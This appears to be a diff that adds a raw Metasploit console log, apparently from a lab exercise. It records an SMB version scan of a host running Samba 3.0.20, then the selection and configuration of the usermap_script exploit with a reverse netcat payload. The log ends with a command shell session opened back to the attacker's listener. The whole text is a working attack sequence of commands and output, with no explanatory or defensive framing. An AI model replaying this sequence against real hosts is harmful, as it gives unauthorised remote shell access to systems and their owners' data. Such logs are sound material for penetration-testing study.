@@ -1,0 +1,94 @@
+msf6 > search smb version aux
+
+Matching Modules
+================
+
+   #  Name                                                      Disclosure Date  Rank    Check  Description
+   -  ----                                                      ---------------  ----    -----  -----------
+   0  auxiliary/gather/crushftp_fileread_cve_2024_4040          .                normal  Yes    CrushFTP Unauthenticated Arbitrary File Read
+   1  auxiliary/dos/windows/smb/rras_vls_null_deref             2006-06-14       normal  No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
+   2  auxiliary/dos/windows/smb/ms11_019_electbowser            .                normal  No     Microsoft Windows Browser Pool DoS
+   3  auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow  .                normal  No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
+   4  auxiliary/scanner/smb/smb_version                         .                normal  No     SMB Version Detection
+   5  auxiliary/server/relay/relay_get_naa_credentials          .                normal  Yes    SMB to HTTP relay version of Get NAA Creds
+
+
+Interact with a module by name or index. For example info 5, use 5 or use auxiliary/server/relay/relay_get_naa_credentials
+
+msf6 > use 4
+msf6 auxiliary(scanner/smb/smb_version) > show optins
+[-] Invalid parameter "optins", use "show -h" for more information
+msf6 auxiliary(scanner/smb/smb_version) > show options
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT                     no        The target port (TCP)
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/smb/smb_version) > set rhost 192.168.6.136
+rhost => 192.168.6.136
+msf6 auxiliary(scanner/smb/smb_version) > run
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.16/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 192.168.6.136:445     -   Host could not be identified: Unix (Samba 3.0.20-Debian)
+[*] 192.168.6.136         - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/smb/smb_version) > back 
+msf6 > use exploit/multi/samba/usermap_script
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > back
+msf6 > search samba 3.0.20-Debian 
+[-] No results from search
+msf6 > search 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                                   Disclosure Date  Rank       Check  Description
+   -  ----                                                   ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba "username map script" Command Execution
+   1  auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation
+
+
+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/admin/http/wp_easycart_privilege_escalation
+
+msf6 > use 0
+[*] Using configured payload cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.6.137    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/samba/usermap_script) > set rhosts 192.168.6.136
+rhosts => 192.168.6.136
+msf6 exploit(multi/samba/usermap_script) > run
+[*] Started reverse TCP handler on 192.168.6.137:4444 
+[*] Command shell session 1 opened (192.168.6.137:4444 -> 192.168.6.136:48154) at 2025-11-13 15:43:33 +0200
